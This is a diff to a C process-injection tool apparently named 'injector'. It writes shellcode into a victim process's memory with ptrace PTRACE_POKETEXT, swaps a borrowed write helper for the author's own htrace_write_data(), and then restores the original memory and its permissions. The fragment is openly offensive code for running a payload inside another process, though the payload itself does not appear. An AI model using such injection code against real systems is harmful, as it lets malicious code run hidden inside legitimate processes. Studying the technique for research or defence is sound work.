@@ -498,20 +498,23 @@ int main(int argc, char* argv[])
 		// dump_pid_mem(vicPID->pidNum, tmpPM_ptr->addr_start + sizeof(void*), sizeof(void*) * 4);
 
 		// Attempt #8 - Use someone else's ptrace(PTRACE_POKEDATA) wrapper to write my ACTUAL shellcode
-		tempRetVal = 0;
+		// tempRetVal = 0;
 		// fprintf(stdout, "BEFORE:\t%p\n", tmpPM_ptr->addr_start);
 		// dump_pid_mem(vicPID->pidNum, tmpPM_ptr->addr_start, payloadSize);
-		ptrace_write(vicPID->pidNum, (unsigned long)tmpPM_ptr->addr_start, (void*)payloadContents, (int)payloadSize);
+		// ptrace_write(vicPID->pidNum, (unsigned long)tmpPM_ptr->addr_start, (void*)payloadContents, (int)payloadSize);
 		// fprintf(stdout, "AFTER\t%p\n", tmpPM_ptr->addr_start);
 		// dump_pid_mem(vicPID->pidNum, tmpPM_ptr->addr_start, payloadSize);
+
+		// Attempt #9 - Replace the functional, yet borrowed, ptrace_write() with htrace_write_data() and troubleshoot
+		tempRetVal = htrace_write_data(vicPID->pidNum, tmpPM_ptr->addr_start, payloadContents, payloadSize);
 
 		if (tempRetVal)
 		{
 			// HARKLE_ERROR(injector, main, copy_local_to_remote failed);
 			// HARKLE_ERRNO(injector, copy_local_to_remote, tempRetVal);
 			// HARKLE_ERROR(injector, main, htrace_write_data failed);
-			// HARKLE_ERRNO(injector, htrace_write_data, tempRetVal);
-			HARKLE_ERROR(injector, main, ptrace_write failed);
+			HARKLE_ERRNO(injector, htrace_write_data, tempRetVal);
+			// HARKLE_ERROR(injector, main, ptrace_write failed);
 			success = false;
 		}
 		// else
@@ -761,7 +764,8 @@ int main(int argc, char* argv[])
 			// 	fprintf(stdout, "[*] Restored PID memory space\n");  // DEBUGGING
 			// }
 
-			ptrace_write(vicPID->pidNum, (unsigned long)tmpPM_ptr->addr_start, (void*)localBackup->iov_base, (int)localBackup->iov_len);
+			// ptrace_write(vicPID->pidNum, (unsigned long)tmpPM_ptr->addr_start, (void*)localBackup->iov_base, (int)localBackup->iov_len);
+			htrace_write_data(vicPID->pidNum, (unsigned long)tmpPM_ptr->addr_start, (void*)localBackup->iov_base, (int)localBackup->iov_len);
 		}
 		
 		// 12.4. Change the permissions on the memory back to r-xp
@@ -921,6 +925,9 @@ void ptrace_write(int pid, unsigned long addr, void *vptr, int len)
 	while (byteCount < len)
 	{
 		memcpy(&word, vptr + byteCount, sizeof(word));
+		// fprintf(stdout, "Attempting to 'ptrace' write this data: ");  // DEBUGGING
+		// fprintf(stdout, "%016lX", word);  // DEBUGGING
+		// fprintf(stdout, " to 0x%016p\n", (void*)(addr + byteCount));
 		word = ptrace(PTRACE_POKETEXT, pid, addr + byteCount, word);
 		if(word == -1)
 		{
